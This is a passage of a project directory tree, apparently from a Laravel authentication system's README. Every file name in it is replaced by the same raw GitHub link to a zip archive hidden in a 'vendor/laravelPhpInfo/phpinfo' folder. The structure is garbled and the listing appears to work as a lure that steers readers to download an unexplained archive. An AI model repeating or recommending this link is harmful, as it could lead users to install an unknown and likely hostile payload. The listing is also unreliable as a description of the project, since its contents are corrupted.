│   │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   │   └── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   ├── images
│   │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   │   └── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   ├── js
│   │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   │   └── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   └── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
├── resources
│   ├── assets
│   │   ├── js
│   │   │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   │   │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   │   │   └── components
│   │   │       ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   │   │       └── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   │   ├── sass
│   │   │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   │   │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   │   │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   │   │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   │   │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   │   │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   │   │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   │   │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   │   │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   │   │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   │   │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   │   │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   │   │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   │   │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   │   │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   │   │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   │   │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   │   │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   │   │   └── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   │   └── scss
│   │       └── laravel2step
│   │           ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   │           ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   │           ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   │           ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   │           ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   │           └── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   ├── lang
│   │   ├── en
│   │   │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   │   │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   │   │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   │   │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   │   │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   │   │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   │   │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   │   │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   │   │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   │   │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   │   │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   │   │   └── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   └── views
│       ├── auth
│       │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│       │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│       │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│       │   ├── passwords
│       │   │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│       │   │   └── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│       │   └── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│       ├── emails
│       │   └── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│       ├── errors
│       │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│       │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│       │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│       │   └── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│       ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│       ├── layouts
│       │   └── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│       ├── modals
│       │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│       │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│       │   └── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│       ├── pages
│       │   ├── admin
│       │   │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│       │   │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│       │   │   └── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│       │   ├── public
│       │   │   └── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│       │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│       │   └── user
│       │       └── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│       ├── panels
│       │   └── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│       ├── partials
│       │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│       │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│       │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│       │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│       │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│       │   └── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│       ├── profiles
│       │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│       │   └── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│       ├── scripts
│       │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│       │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│       │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│       │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│       │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│       │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│       │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│       │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│       │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│       │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│       │   └── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│       ├── usersmanagement
│       │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│       │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│       │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│       │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│       │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│       │   └── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│       └── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
├── routes
│   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   └── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
└── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
```
